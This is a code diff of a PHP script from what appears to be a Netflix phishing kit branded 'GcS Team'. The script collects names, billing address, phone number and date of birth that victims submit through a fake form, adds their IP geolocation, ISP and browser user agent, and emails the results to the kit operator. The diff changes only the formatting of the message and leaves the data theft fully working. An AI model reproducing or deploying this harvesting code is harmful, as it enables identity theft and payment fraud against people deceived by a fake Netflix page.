@@ -69,10 +69,10 @@ $headers = "From: GcS-Team<info@GcSTeam.com>";
 $send = $email; 
 
 
-$message = "【🔥 NetFlix Fire 🔥】\r\n";
+$message = "-----【🔥 NetFlix Fire 🔥】-----\r\n";
 $message .= "|First name : " .$_POST['firstName']."\r\n";
 $message .= "|Last name  : " .$_POST['lastName']."\r\n";
-$message .= "【📓 Billing INFO】\r\n";
+$message .= "-----【📓 Billing INFO】-----\r\n";
 $message .= "|Country : " .$_POST['country']."\r\n";
 $message .= "|Billing Address  : " .$_POST['address']."\r\n";
 $message .= "|Billing Address 2 : " .$_POST['address2']."\r\n";
@@ -81,10 +81,10 @@ $message .= "|City : " .$_POST['city']."\r\n";
 $message .= "|State : " .$_POST['state']."\r\n";
 $message .= "|Phone : " .$_POST['phone']."\r\n";
 $message .= "|Date of birth : " .$_POST['birthday']."\r\n";
-$message .= "【💻 System INFO】\r\n";
+$message .= "-----【💻 System INFO】-----\r\n";
 $message .=$ip."\nCountry : ".$COUNTRY."City: " .$CITY."Region : " .$REGION."State: " .$STATE."Zip : " .$ZIPCODE."country code: " .$countryCode."lat: " .$lat."lon: " .$lon."timezone: " .$timezone."isp: " .$isp."as: " .$as;
 $message .= "UserAgent  :  ".$_SERVER['HTTP_USER_AGENT']."\n";
-$message .= "[GcS Team🇩🇿][+]━━━━【🔥 NetFlix Fire 🔥】━━━━[+][GcS Team🇩🇿]\n";
+//$message .= "[GcS Team🇩🇿][+]━━━━【🔥 NetFlix Fire 🔥】━━━━[+][GcS Team🇩🇿]\n";
 mail($send,$subject,$message,$headers);
 
 
